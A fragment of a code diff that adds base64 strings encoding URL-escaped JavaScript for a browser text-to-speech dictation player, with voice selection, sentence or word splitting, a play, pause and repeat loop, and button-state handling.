+    +"MjklM0IlMEElMjAlMjAlMjAlMjBjb25zdCUyMHByZXZOYW1lJTIwJTNEJTIwc2VsZWN0ZWRWb2ljZSUy"
+    +"MCUzRiUyMHNlbGVjdGVkVm9pY2UubmFtZSUyMCUzQSUyMG51bGwlM0IlMEElMjAlMjAlMjAlMjBzZWwu"
+    +"aW5uZXJIVE1MJTIwJTNEJTIwJTI3JTI3JTNCJTBBJTIwJTIwJTIwJTIwdm9pY2VzLmZvckVhY2glMjgl"
+    +"Mjh2JTJDJTIwaSUyOSUyMCUzRCUzRSUyMCU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMGNvbnN0JTIwb3B0"
+    +"JTIwJTNEJTIwZG9jdW1lbnQuY3JlYXRlRWxlbWVudCUyOCUyN29wdGlvbiUyNyUyOSUzQiUwQSUyMCUy"
+    +"MCUyMCUyMCUyMCUyMG9wdC52YWx1ZSUyMCUzRCUyMGklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjBvcHQu"
+    +"dGV4dENvbnRlbnQlMjAlM0QlMjAlNjAlMjQlN0J2Lm5hbWUlN0QlMjAlMjglMjQlN0J2LmxhbmclN0Ql"
+    +"MjklMjQlN0J2LmRlZmF1bHQlMjAlM0YlMjAlMjclMjAlRTIlOTglODUlMjclMjAlM0ElMjAlMjclMjcl"
+    +"N0QlNjAlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjBzZWwuYXBwZW5kQ2hpbGQlMjhvcHQlMjklM0IlMEEl"
+    +"MjAlMjAlMjAlMjAlN0QlMjklM0IlMEElMjAlMjAlMjAlMjBpZiUyMCUyOCUyMXZvaWNlcy5sZW5ndGgl"
+    +"MjklMjByZXR1cm4lM0IlMEElMEElMjAlMjAlMjAlMjAlMkYlMkYlMjBQaWNrJTIwdm9pY2UlM0ElMjBy"
+    +"ZXN0b3JlJTIwcHJldmlvdXMlMjBzZWxlY3Rpb24lMkMlMjBlbHNlJTIwcHJlZmVyJTIwZW4tVVMlMkZl"
+    +"bi1HQiUyRmFueS1lbiUwQSUyMCUyMCUyMCUyMGxldCUyMHBpY2slMjAlM0QlMjBwcmV2TmFtZSUyMCUz"
+    +"RiUyMHZvaWNlcy5maW5kSW5kZXglMjh2JTIwJTNEJTNFJTIwdi5uYW1lJTIwJTNEJTNEJTNEJTIwcHJl"
+    +"dk5hbWUlMjklMjAlM0ElMjAtMSUzQiUwQSUyMCUyMCUyMCUyMGlmJTIwJTI4cGljayUyMCUzRCUzRCUz"
+    +"RCUyMC0xJTI5JTIwJTdCJTBBJTIwJTIwJTIwJTIwJTIwJTIwcGljayUyMCUzRCUyMHZvaWNlcy5maW5k"
+    +"SW5kZXglMjh2JTIwJTNEJTNFJTIwdi5sYW5nJTIwJTNEJTNEJTNEJTIwJTI3ZW4tVVMlMjclMjklM0Il"
+    +"MEElMjAlMjAlMjAlMjAlMjAlMjBpZiUyMCUyOHBpY2slMjAlM0QlM0QlM0QlMjAtMSUyOSUyMHBpY2sl"
+    +"MjAlM0QlMjB2b2ljZXMuZmluZEluZGV4JTI4diUyMCUzRCUzRSUyMHYubGFuZyUyMCUzRCUzRCUzRCUy"
+    +"MCUyN2VuLUdCJTI3JTI5JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwaWYlMjAlMjhwaWNrJTIwJTNEJTNE"
+    +"JTNEJTIwLTElMjklMjBwaWNrJTIwJTNEJTIwdm9pY2VzLmZpbmRJbmRleCUyOHYlMjAlM0QlM0UlMjAl"
+    +"MkYlNUVlbiUyRi50ZXN0JTI4di5sYW5nJTI5JTI5JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwaWYlMjAl"
+    +"MjhwaWNrJTIwJTNEJTNEJTNEJTIwLTElMjklMjBwaWNrJTIwJTNEJTIwdm9pY2VzLmZpbmRJbmRleCUy"
+    +"OHYlMjAlM0QlM0UlMjB2LmRlZmF1bHQlMjklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjBpZiUyMCUyOHBp"
+    +"Y2slMjAlM0QlM0QlM0QlMjAtMSUyOSUyMHBpY2slMjAlM0QlMjAwJTNCJTBBJTIwJTIwJTIwJTIwJTdE"
+    +"JTBBJTIwJTIwJTIwJTIwc2VsLnZhbHVlJTIwJTNEJTIwcGljayUzQiUwQSUyMCUyMCUyMCUyMHNlbGVj"
+    +"dGVkVm9pY2UlMjAlM0QlMjB2b2ljZXMlNUJwaWNrJTVEJTNCJTBBJTIwJTIwJTdEJTBBJTBBJTIwJTIw"
+    +"JTI0JTI4JTI3dm9pY2Utc2VsZWN0JTI3JTI5LmFkZEV2ZW50TGlzdGVuZXIlMjglMjdjaGFuZ2UlMjcl"
+    +"MkMlMjAlMjglMjklMjAlM0QlM0UlMjAlN0IlMEElMjAlMjAlMjAlMjBjb25zdCUyMHZvaWNlcyUyMCUz"
+    +"RCUyMHNwZWVjaFN5bnRoZXNpcy5nZXRWb2ljZXMlMjglMjklM0IlMEElMjAlMjAlMjAlMjBzZWxlY3Rl"
+    +"ZFZvaWNlJTIwJTNEJTIwdm9pY2VzJTVCJTJCJTI0JTI4JTI3dm9pY2Utc2VsZWN0JTI3JTI5LnZhbHVl"
+    +"JTVEJTIwJTdDJTdDJTIwbnVsbCUzQiUwQSUyMCUyMCU3RCUyOSUzQiUwQSUwQSUyMCUyMGlmJTIwJTI4"
+    +"c3BlZWNoU3ludGhlc2lzLmdldFZvaWNlcyUyOCUyOS5sZW5ndGglMjklMjBwb3B1bGF0ZSUyOCUyOSUz"
+    +"QiUwQSUyMCUyMHNwZWVjaFN5bnRoZXNpcy5vbnZvaWNlc2NoYW5nZWQlMjAlM0QlMjBwb3B1bGF0ZSUz"
+    +"QiUwQSU3RCUwQSUwQSUwQSUyRiUyRiUyMC0tLS0tJTIwUGxheWJhY2slMjBlbmdpbmUlMjAtLS0tLSUw"
+    +"QSUyRiUyRiUyMFNpbmdsZSUyMHNvdXJjZSUyMG9mJTIwdHJ1dGglM0ElMjBpc1BsYXlpbmclMjAlM0Ql"
+    +"MjBsb29wJTIwaXMlMjBydW5uaW5nJTJDJTIwaXNSZXBlYXRpbmclMjAlM0QlMjBsb29wJTIwYmVoYXZp"
+    +"b3VyJTIwZmxhZyUyMG9ubHkuJTBBZnVuY3Rpb24lMjBpbml0UGxheWJhY2slMjglMjklMjAlN0IlMEEl"
+    +"MjAlMjAlMjQlMjglMjdwbGF5LWJ0biUyNyUyOS5hZGRFdmVudExpc3RlbmVyJTI4JTI3Y2xpY2slMjcl"
+    +"MkMlMjBoYW5kbGVQbGF5UGF1c2UlMjklM0IlMEElMjAlMjAlMjQlMjglMjdyZXBlYXQtYnRuJTI3JTI5"
+    +"LmFkZEV2ZW50TGlzdGVuZXIlMjglMjdjbGljayUyNyUyQyUyMHRvZ2dsZVJlcGVhdCUyOSUzQiUwQSUy"
+    +"MCUyMCUyNCUyOCUyN3N0b3AtYnRuJTI3JTI5LmFkZEV2ZW50TGlzdGVuZXIlMjglMjdjbGljayUyNyUy"
+    +"QyUyMHN0b3BEaWN0YXRpb24lMjklM0IlMEElMjAlMjAlMjQlMjglMjdwcmV2LWJ0biUyNyUyOS5hZGRF"
+    +"dmVudExpc3RlbmVyJTI4JTI3Y2xpY2slMjclMkMlMjAlMjglMjklMjAlM0QlM0UlMjBqdW1wVG8lMjhj"
+    +"dXJyZW50SW5kZXglMjAtJTIwMSUyOSUyOSUzQiUwQSUyMCUyMCUyNCUyOCUyN25leHQtYnRuJTI3JTI5"
+    +"LmFkZEV2ZW50TGlzdGVuZXIlMjglMjdjbGljayUyNyUyQyUyMCUyOCUyOSUyMCUzRCUzRSUyMGp1bXBU"
+    +"byUyOGN1cnJlbnRJbmRleCUyMCUyQiUyMDElMjklMjklM0IlMEElMjAlMjAlMjQlMjglMjdyZXZlYWwt"
+    +"YnRuJTI3JTI5LmFkZEV2ZW50TGlzdGVuZXIlMjglMjdjbGljayUyNyUyQyUyMHRvZ2dsZVJldmVhbCUy"
+    +"OSUzQiUwQSU3RCUwQSUwQWZ1bmN0aW9uJTIwcGFyc2VDb250ZW50JTI4dGV4dCUyQyUyMG1vZGUlMjkl"
+    +"MjAlN0IlMEElMjAlMjBpZiUyMCUyOG1vZGUlMjAlM0QlM0QlM0QlMjAlMjdzZW50ZW5jZSUyNyUyOSUy"
+    +"MCU3QiUwQSUyMCUyMCUyMCUyMHJldHVybiUyMHRleHQlMEElMjAlMjAlMjAlMjAlMjAlMjAucmVwbGFj"
+    +"ZSUyOCUyRiUyOCU1Qi4lMjElM0YlMkMlNUQlMjklNUNzJTJCJTJGZyUyQyUyMCUyNyUyNDElNUNuJTI3"
+    +"JTI5JTBBJTIwJTIwJTIwJTIwJTIwJTIwLnNwbGl0JTI4JTI3JTVDbiUyNyUyOSUwQSUyMCUyMCUyMCUy"
+    +"MCUyMCUyMC5tYXAlMjhzJTIwJTNEJTNFJTIwcy50cmltJTI4JTI5JTI5JTBBJTIwJTIwJTIwJTIwJTIw"
+    +"JTIwLmZpbHRlciUyOHMlMjAlM0QlM0UlMjBzLmxlbmd0aCUyMCUzRSUyMDElMjklM0IlMEElMjAlMjAl"
+    +"N0QlMEElMjAlMjByZXR1cm4lMjB0ZXh0LnNwbGl0JTI4JTJGJTVDcyUyQiUyRiUyOS5maWx0ZXIlMjh3"
+    +"JTIwJTNEJTNFJTIwdy5sZW5ndGglMjAlM0UlMjAwJTI5JTNCJTBBJTdEJTBBJTBBZnVuY3Rpb24lMjBo"
+    +"YW5kbGVQbGF5UGF1c2UlMjglMjklMjAlN0IlMEElMjAlMjBpZiUyMCUyOCUyMWlzUGxheWluZyUyOSUy"
+    +"MCU3QiUyMHN0YXJ0RGljdGF0aW9uJTI4JTI5JTNCJTIwcmV0dXJuJTNCJTIwJTdEJTBBJTIwJTIwdG9n"
+    +"Z2xlUGF1c2UlMjglMjklM0IlMEElN0QlMEElMEFhc3luYyUyMGZ1bmN0aW9uJTIwc3RhcnREaWN0YXRp"
+    +"b24lMjglMjklMjAlN0IlMEElMjAlMjBjb25zdCUyMHRleHQlMjAlM0QlMjAlMjQlMjglMjd0ZXh0LWlu"
+    +"cHV0JTI3JTI5LnZhbHVlLnRyaW0lMjglMjklM0IlMEElMjAlMjBpZiUyMCUyOCUyMXRleHQlMjklMjAl"
+    +"N0IlMjBhbGVydCUyOHQlMjglMjdhbGVydE5vVGV4dCUyNyUyOSUyOSUzQiUyMHJldHVybiUzQiUyMCU3"
+    +"RCUwQSUyMCUyMGRpY3RhdGlvbkl0ZW1zJTIwJTNEJTIwcGFyc2VDb250ZW50JTI4dGV4dCUyQyUyMGRp"
+    +"Y3RhdGlvbk1vZGUlMjklM0IlMEElMjAlMjBpZiUyMCUyOCUyMWRpY3RhdGlvbkl0ZW1zLmxlbmd0aCUy"
+    +"OSUyMHJldHVybiUzQiUwQSUyMCUyMGN1cnJlbnRJbmRleCUyMCUzRCUyMDAlM0IlMEElMjAlMjBpc1Bs"
+    +"YXlpbmclMjAlM0QlMjB0cnVlJTNCJTBBJTIwJTIwaXNQYXVzZWQlMjAlM0QlMjBmYWxzZSUzQiUwQSUy"
+    +"MCUyMHNwZWVjaFN5bnRoZXNpcy5jYW5jZWwlMjglMjklM0IlMEElMjAlMjBjb25zdCUyMGdlbiUyMCUz"
+    +"RCUyMCUyQiUyQmRpY3RhdGlvbkdlbiUzQiUwQSUyMCUyMHVwZGF0ZUJ1dHRvbnMlMjglMjklM0IlMEEl"
+    +"MjAlMjBhd2FpdCUyMHJ1bkxvb3AlMjhnZW4lMjklM0IlMEElN0QlMEElMEElMkYlMkYlMjBPbmUlMjBs"
+    +"b29wJTIwZm9yJTIwYm90aCUyMG5vcm1hbCUyMGFuZCUyMHJlcGVhdCUyMG1vZGUuJTIwaXNSZXBlYXRp"
+    +"bmclMjBpcyUyMGp1c3QlMjBhJTIwZmxhZyUyMGl0JTIwcmVhZHMuJTBBYXN5bmMlMjBmdW5jdGlvbiUy"
+    +"MHJ1bkxvb3AlMjhnZW4lMjklMjAlN0IlMEElMjAlMjB3aGlsZSUyMCUyOGRpY3RhdGlvbkdlbiUyMCUz"
+    +"RCUzRCUzRCUyMGdlbiUyOSUyMCU3QiUwQSUyMCUyMCUyMCUyMHVwZGF0ZURpc3BsYXklMjhjdXJyZW50"
+    +"SW5kZXglMjklM0IlMEElMjAlMjAlMjAlMjBpZiUyMCUyOGlzUGF1c2VkJTI5JTIwYXdhaXQlMjB3YWl0"
+    +"Rm9yUmVzdW1lJTI4JTI5JTNCJTBBJTIwJTIwJTIwJTIwaWYlMjAlMjhkaWN0YXRpb25HZW4lMjAlMjEl"
+    +"M0QlM0QlMjBnZW4lMjklMjBicmVhayUzQiUwQSUwQSUyMCUyMCUyMCUyMGZvciUyMCUyOGxldCUyMHIl"
+    +"MjAlM0QlMjAwJTNCJTIwciUyMCUzQyUyMHJlcGVhdENvdW50JTIwJTI2JTI2JTIwZGljdGF0aW9uR2Vu"
+    +"JTIwJTNEJTNEJTNEJTIwZ2VuJTNCJTIwciUyQiUyQiUyOSUyMCU3QiUwQSUyMCUyMCUyMCUyMCUyMCUy"
+    +"MGlmJTIwJTI4aXNQYXVzZWQlMjklMjBhd2FpdCUyMHdhaXRGb3JSZXN1bWUlMjglMjklM0IlMEElMjAl"
+    +"MjAlMjAlMjAlMjAlMjBpZiUyMCUyOGRpY3RhdGlvbkdlbiUyMCUyMSUzRCUzRCUyMGdlbiUyOSUyMGJy"
+    +"ZWFrJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwYXdhaXQlMjBzcGVha0l0ZW0lMjhkaWN0YXRpb25JdGVt"
+    +"cyU1QmN1cnJlbnRJbmRleCU1RCUyOSUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMGlmJTIwJTI4ZGljdGF0"
+    +"aW9uR2VuJTIwJTIxJTNEJTNEJTIwZ2VuJTI5JTIwYnJlYWslM0IlMEElMjAlMjAlMjAlMjAlMjAlMjBp"
+    +"ZiUyMCUyOHIlMjAlMkIlMjAxJTIwJTNDJTIwcmVwZWF0Q291bnQlMjklMjBhd2FpdCUyMHNsZWVwJTI4"
+    +"cGF1c2VEdXJhdGlvbiUyOSUzQiUwQSUyMCUyMCUyMCUyMCU3RCUwQSUwQSUyMCUyMCUyMCUyMGlmJTIw"
+    +"JTI4ZGljdGF0aW9uR2VuJTIwJTIxJTNEJTNEJTIwZ2VuJTI5JTIwYnJlYWslM0IlMEElMEElMjAlMjAl"
+    +"MjAlMjBpZiUyMCUyOGlzUmVwZWF0aW5nJTI5JTIwJTdCJTBBJTIwJTIwJTIwJTIwJTIwJTIwYXdhaXQl"
+    +"MjBzbGVlcCUyOHBhdXNlRHVyYXRpb24lMjklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMkYlMkYlMjBz"
+    +"dGF5JTIwb24lMjBzYW1lJTIwaW5kZXglMjAlRTIlODAlOTQlMjBsb29wJTIwYmFjayUyMHRvJTIwdG9w"
+    +"JTBBJTIwJTIwJTIwJTIwJTdEJTIwZWxzZSUyMCU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMGlmJTIwJTI4"
+    +"Y3VycmVudEluZGV4JTIwJTJCJTIwMSUyMCUzRSUzRCUyMGRpY3RhdGlvbkl0ZW1zLmxlbmd0aCUyOSUy"
+    +"MGJyZWFrJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwYXdhaXQlMjBzbGVlcCUyOHBhdXNlRHVyYXRpb24l"
+    +"MjklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjBpZiUyMCUyOGRpY3RhdGlvbkdlbiUyMCUyMSUzRCUzRCUy"
+    +"MGdlbiUyOSUyMGJyZWFrJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwY3VycmVudEluZGV4JTJCJTJCJTNC"
+    +"JTBBJTIwJTIwJTIwJTIwJTdEJTBBJTIwJTIwJTdEJTBBJTBBJTIwJTIwaWYlMjAlMjhkaWN0YXRpb25H"
+    +"ZW4lMjAlM0QlM0QlM0QlMjBnZW4lMjklMjAlN0IlMEElMjAlMjAlMjAlMjBpc1BsYXlpbmclMjAlM0Ql"
+    +"MjBmYWxzZSUzQiUwQSUyMCUyMCUyMCUyMGlzUmVwZWF0aW5nJTIwJTNEJTIwZmFsc2UlM0IlMEElMjAl"
+    +"MjAlMjAlMjB1cGRhdGVCdXR0b25zJTI4JTI5JTNCJTBBJTIwJTIwJTdEJTBBJTdEJTBBJTBBYXN5bmMl"
+    +"MjBmdW5jdGlvbiUyMHNwZWFrSXRlbSUyOGl0ZW0lMjklMjAlN0IlMEElMjAlMjBhd2FpdCUyMHNwZWFr"
+    +"VFRTJTI4aXRlbSUyOSUzQiUwQSU3RCUwQSUwQWZ1bmN0aW9uJTIwc3BlYWtUVFMlMjh0ZXh0JTI5JTIw"
+    +"JTdCJTBBJTIwJTIwcmV0dXJuJTIwbmV3JTIwUHJvbWlzZSUyOHJlc29sdmUlMjAlM0QlM0UlMjAlN0Il"
+    +"MEElMjAlMjAlMjAlMjBmdW5jdGlvbiUyMHNwZWFrTWFpbiUyOCUyOSUyMCU3QiUwQSUyMCUyMCUyMCUy"
+    +"MCUyMCUyMGNvbnN0JTIwdXR0ZXIlMjAlM0QlMjBuZXclMjBTcGVlY2hTeW50aGVzaXNVdHRlcmFuY2Ul"
+    +"Mjh0ZXh0JTI5JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwaWYlMjAlMjhzZWxlY3RlZFZvaWNlJTI5JTIw"
+    +"JTdCJTIwdXR0ZXIudm9pY2UlMjAlM0QlMjBzZWxlY3RlZFZvaWNlJTNCJTIwdXR0ZXIubGFuZyUyMCUz"
+    +"RCUyMHNlbGVjdGVkVm9pY2UubGFuZyUzQiUyMCU3RCUwQSUyMCUyMCUyMCUyMCUyMCUyMHV0dGVyLnJh"
+    +"dGUlMjAlM0QlMjBzcGVlY2hSYXRlJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwdXR0ZXIub25lbmQlMjAl"
+    +"M0QlMjByZXNvbHZlJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwdXR0ZXIub25lcnJvciUyMCUzRCUyMHJl"
+    +"c29sdmUlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjBzcGVlY2hTeW50aGVzaXMuc3BlYWslMjh1dHRlciUy"
+    +"OSUzQiUwQSUyMCUyMCUyMCUyMCU3RCUwQSUyMCUyMCUyMCUyMCUyRiUyRiUyMFF1ZXVlJTIwbWFpbiUy"
+    +"MHV0dGVyYW5jZSUyMG9ubHklMjBhZnRlciUyMHdhcm11cCUyMGVuZHMlMjBzbyUyMHRoZSUyMFRUUyUy"
+    +"MGVuZ2luZSUyMGlzJTIwZnVsbHklMEElMjAlMjAlMjAlMjAlMkYlMkYlMjBpbml0aWFsaXplZCUyMGJl"
+    +"Zm9yZSUyMHRoZSUyMGZpcnN0JTIwcmVhbCUyMHdvcmQlMjBwbGF5cyUyMCUyOGZpeGVzJTIwZmlyc3Qt"
+    +"Y2xpY2slMjBzaWxlbmNlJTI5LiUwQSUyMCUyMCUyMCUyMGNvbnN0JTIwd2FybXVwJTIwJTNEJTIwbmV3"
+    +"JTIwU3BlZWNoU3ludGhlc2lzVXR0ZXJhbmNlJTI4JTI3LiUyNyUyOSUzQiUwQSUyMCUyMCUyMCUyMHdh"
+    +"cm11cC52b2x1bWUlMjAlM0QlMjAwJTNCJTBBJTIwJTIwJTIwJTIwd2FybXVwLnJhdGUlMjAlM0QlMjAx"
+    +"MCUzQiUwQSUyMCUyMCUyMCUyMGlmJTIwJTI4c2VsZWN0ZWRWb2ljZSUyOSUyMCU3QiUyMHdhcm11cC52"
+    +"b2ljZSUyMCUzRCUyMHNlbGVjdGVkVm9pY2UlM0IlMjB3YXJtdXAubGFuZyUyMCUzRCUyMHNlbGVjdGVk"
+    +"Vm9pY2UubGFuZyUzQiUyMCU3RCUwQSUyMCUyMCUyMCUyMHdhcm11cC5vbmVuZCUyMCUzRCUyMHNwZWFr"
+    +"TWFpbiUzQiUwQSUyMCUyMCUyMCUyMHdhcm11cC5vbmVycm9yJTIwJTNEJTIwc3BlYWtNYWluJTNCJTBB"
+    +"JTIwJTIwJTIwJTIwc3BlZWNoU3ludGhlc2lzLnNwZWFrJTI4d2FybXVwJTI5JTNCJTBBJTIwJTIwJTdE"
+    +"JTI5JTNCJTBBJTdEJTBBJTBBZnVuY3Rpb24lMjBzbGVlcCUyOG1zJTI5JTIwJTdCJTBBJTIwJTIwcmV0"
+    +"dXJuJTIwbmV3JTIwUHJvbWlzZSUyOHJlc29sdmUlMjAlM0QlM0UlMjAlN0IlMEElMjAlMjAlMjAlMjBj"
+    +"b25zdCUyMHRpbWVyJTIwJTNEJTIwc2V0VGltZW91dCUyOHJlc29sdmUlMkMlMjBtcyUyOSUzQiUwQSUy"
+    +"MCUyMCUyMCUyMHBhdXNlUmVzb2x2ZSUyMCUzRCUyMCUyOCUyOSUyMCUzRCUzRSUyMCU3QiUyMGNsZWFy"
+    +"VGltZW91dCUyOHRpbWVyJTI5JTNCJTIwcmVzb2x2ZSUyOCUyOSUzQiUyMCU3RCUzQiUwQSUyMCUyMCU3"
+    +"RCUyOS50aGVuJTI4JTI4JTI5JTIwJTNEJTNFJTIwJTdCJTIwcGF1c2VSZXNvbHZlJTIwJTNEJTIwbnVs"
+    +"bCUzQiUyMCU3RCUyOSUzQiUwQSU3RCUwQSUwQWZ1bmN0aW9uJTIwd2FpdEZvclJlc3VtZSUyOCUyOSUy"
+    +"MCU3QiUwQSUyMCUyMHJldHVybiUyMG5ldyUyMFByb21pc2UlMjhyZXNvbHZlJTIwJTNEJTNFJTIwJTdC"
+    +"JTIwcGF1c2VSZXNvbHZlJTIwJTNEJTIwcmVzb2x2ZSUzQiUyMCU3RCUyOSUzQiUwQSU3RCUwQSUwQWZ1"
+    +"bmN0aW9uJTIwY2FuY2VsTG9vcCUyOCUyOSUyMCU3QiUwQSUyMCUyMHNwZWVjaFN5bnRoZXNpcy5jYW5j"
+    +"ZWwlMjglMjklM0IlMEElMjAlMjBpZiUyMCUyOHBhdXNlUmVzb2x2ZSUyOSUyMCU3QiUyMGNvbnN0JTIw"
+    +"ciUyMCUzRCUyMHBhdXNlUmVzb2x2ZSUzQiUyMHBhdXNlUmVzb2x2ZSUyMCUzRCUyMG51bGwlM0IlMjBy"
+    +"JTI4JTI5JTNCJTIwJTdEJTBBJTdEJTBBJTBBZnVuY3Rpb24lMjB1cGRhdGVCdXR0b25zJTI4JTI5JTIw"
+    +"JTdCJTBBJTIwJTIwY29uc3QlMjBwbGF5QnRuJTIwJTNEJTIwJTI0JTI4JTI3cGxheS1idG4lMjclMjkl"
+    +"M0IlMEElMjAlMjBpZiUyMCUyOGlzUGxheWluZyUyMCUyNiUyNiUyMCUyMWlzUGF1c2VkJTI5JTIwJTdC"
+    +"JTBBJTIwJTIwJTIwJTIwcGxheUJ0bi50ZXh0Q29udGVudCUyMCUzRCUyMCUyNyVFMiU4RiVCOCUyNyUz"
+    +"QiUwQSUyMCUyMCUyMCUyMHBsYXlCdG4udGl0bGUlMjAlM0QlMjAlMjdQYXVzZSUyNyUzQiUwQSUyMCUy"
+    +"MCU3RCUyMGVsc2UlMjAlN0IlMEElMjAlMjAlMjAlMjBwbGF5QnRuLnRleHRDb250ZW50JTIwJTNEJTIw"
+    +"JTI3JUUyJTk2JUI2JTI3JTNCJTBBJTIwJTIwJTIwJTIwcGxheUJ0bi50aXRsZSUyMCUzRCUyMGlzUGF1"
+    +"c2VkJTIwJTNGJTIwJTI3UmVzdW1lJTI3JTIwJTNBJTIwJTI3UGxheSUyNyUzQiUwQSUyMCUyMCU3RCUw"
+    +"QSUyMCUyMHBsYXlCdG4uZGlzYWJsZWQlMjAlM0QlMjBmYWxzZSUzQiUwQSUyMCUyMCUyNCUyOCUyN3Jl"
+    +"cGVhdC1idG4lMjclMjkuZGlzYWJsZWQlMjAlM0QlMjAlMjFpc1BsYXlpbmclM0IlMEElMjAlMjAlMjQl"
+    +"MjglMjdyZXBlYXQtYnRuJTI3JTI5LmNsYXNzTGlzdC50b2dnbGUlMjglMjdhY3RpdmUlMjclMkMlMjBp"
+    +"c1JlcGVhdGluZyUyOSUzQiUwQSUyMCUyMCUyNCUyOCUyN3JlcGVhdC1idG4lMjclMjkudGl0bGUlMjAl"
+    +"M0QlMjBpc1JlcGVhdGluZyUyMCUzRiUyMCUyN1N0b3AlMjByZXBlYXRpbmclMjclMjAlM0ElMjAlMjdS"
+    +"ZXBlYXQlMjBjdXJyZW50JTI3JTNCJTBBJTIwJTIwJTI0JTI4JTI3c3RvcC1idG4lMjclMjkuZGlzYWJs"
+    +"ZWQlMjAlM0QlMjAlMjFpc1BsYXlpbmclM0IlMEElMjAlMjBpZiUyMCUyOCUyMWlzUGxheWluZyUyOSUy"
+    +"MCU3QiUwQSUyMCUyMCUyMCUyMCUyNCUyOCUyN3ByZXYtYnRuJTI3JTI5LmRpc2FibGVkJTIwJTNEJTIw"
+    +"dHJ1ZSUzQiUwQSUyMCUyMCUyMCUyMCUyNCUyOCUyN25leHQtYnRuJTI3JTI5LmRpc2FibGVkJTIwJTNE"
+    +"JTIwdHJ1ZSUzQiUwQSUyMCUyMCU3RCUwQSU3RCUwQSUwQWZ1bmN0aW9uJTIwdG9nZ2xlUGF1c2UlMjgl"
+    +"MjklMjAlN0IlMEElMjAlMjBpZiUyMCUyOCUyMWlzUGxheWluZyUyOSUyMHJldHVybiUzQiUwQSUyMCUy"
+    +"MGlzUGF1c2VkJTIwJTNEJTIwJTIxaXNQYXVzZWQlM0IlMEElMjAlMjBpZiUyMCUyOGlzUGF1c2VkJTI5"
+    +"JTIwJTdCJTBBJTIwJTIwJTIwJTIwc3BlZWNoU3ludGhlc2lzLnBhdXNlJTI4JTI5JTNCJTBBJTIwJTIw"
+    +"JTIwJTIwJTJGJTJGJTIwaW50ZXJydXB0JTIwaW50ZXItaXRlbSUyMHNsZWVwJTIwc28lMjBsb29wJTIw"
+    +"cGFya3MlMjBhdCUyMHdhaXRGb3JSZXN1bWUlMjBpbW1lZGlhdGVseSUwQSUyMCUyMCUyMCUyMGlmJTIw"
+    +"JTI4cGF1c2VSZXNvbHZlJTI5JTIwJTdCJTIwY29uc3QlMjByJTIwJTNEJTIwcGF1c2VSZXNvbHZlJTNC"
+    +"JTIwcGF1c2VSZXNvbHZlJTIwJTNEJTIwbnVsbCUzQiUyMHIlMjglMjklM0IlMjAlN0QlMEElMjAlMjAl"
+    +"N0QlMjBlbHNlJTIwJTdCJTBBJTIwJTIwJTIwJTIwc3BlZWNoU3ludGhlc2lzLnJlc3VtZSUyOCUyOSUz"
+    +"QiUwQSUyMCUyMCUyMCUyMGlmJTIwJTI4cGF1c2VSZXNvbHZlJTI5JTIwJTdCJTIwY29uc3QlMjByJTIw"
+    +"JTNEJTIwcGF1c2VSZXNvbHZlJTNCJTIwcGF1c2VSZXNvbHZlJTIwJTNEJTIwbnVsbCUzQiUyMHIlMjgl"
+    +"MjklM0IlMjAlN0QlMEElMjAlMjAlN0QlMEElMjAlMjB1cGRhdGVCdXR0b25zJTI4JTI5JTNCJTBBJTdE"
+    +"JTBBJTBBZnVuY3Rpb24lMjB0b2dnbGVSZXBlYXQlMjglMjklMjAlN0IlMEElMjAlMjBpZiUyMCUyOCUy"
+    +"MWlzUGxheWluZyUyOSUyMHJldHVybiUzQiUwQSUyMCUyMGlzUmVwZWF0aW5nJTIwJTNEJTIwJTIxaXNS"
+    +"ZXBlYXRpbmclM0IlMEElMjAlMjB1cGRhdGVCdXR0b25zJTI4JTI5JTNCJTBBJTdEJTBBJTBBZnVuY3Rp"
+    +"b24lMjBzdG9wRGljdGF0aW9uJTI4JTI5JTIwJTdCJTBBJTIwJTIwZGljdGF0aW9uR2VuJTJCJTJCJTNC"
+    +"JTBBJTIwJTIwaXNQbGF5aW5nJTIwJTNEJTIwZmFsc2UlM0IlMEElMjAlMjBpc1BhdXNlZCUyMCUzRCUy"
+    +"MGZhbHNlJTNCJTBBJTIwJTIwaXNSZXBlYXRpbmclMjAlM0QlMjBmYWxzZSUzQiUwQSUyMCUyMGNhbmNl"
+    +"bExvb3AlMjglMjklM0IlMEElMjAlMjB1cGRhdGVCdXR0b25zJTI4JTI5JTNCJTBBJTIwJTIwJTI0JTI4"
+    +"JTI3Y3VycmVudC1pdGVtJTI3JTI5LnRleHRDb250ZW50JTIwJTNEJTIwJTI3JUUyJTgwJTk0JTI3JTNC"
+    +"JTBBJTIwJTIwJTI0JTI4JTI3cHJvZ3Jlc3MtdGV4dCUyNyUyOS50ZXh0Q29udGVudCUyMCUzRCUyMCUy"
+    +"NzAlMjAlMkYlMjAwJTI3JTNCJTBBJTIwJTIwJTI0JTI4JTI3cHJvZ3Jlc3MtYmFyJTI3JTI5LnN0eWxl"
+    +"LndpZHRoJTIwJTNEJTIwJTI3MCUyNSUyNyUzQiUwQSU3RCUwQSUwQWZ1bmN0aW9uJTIwanVtcFRvJTI4"
+    +"aW5kZXglMjklMjAlN0IlMEElMjAlMjBpZiUyMCUyOGluZGV4JTIwJTNDJTIwMCUyMCU3QyU3QyUyMGlu"
+    +"ZGV4JTIwJTNFJTNEJTIwZGljdGF0aW9uSXRlbXMubGVuZ3RoJTI5JTIwcmV0dXJuJTNCJTBBJTIwJTIw"
+    +"Y3VycmVudEluZGV4JTIwJTNEJTIwaW5kZXglM0IlMEElMjAlMjBpc1BsYXlpbmclMjAlM0QlMjB0cnVl"
+    +"JTNCJTBBJTIwJTIwY2FuY2VsTG9vcCUyOCUyOSUzQiUwQSUyMCUyMGNvbnN0JTIwZ2VuJTIwJTNEJTIw"
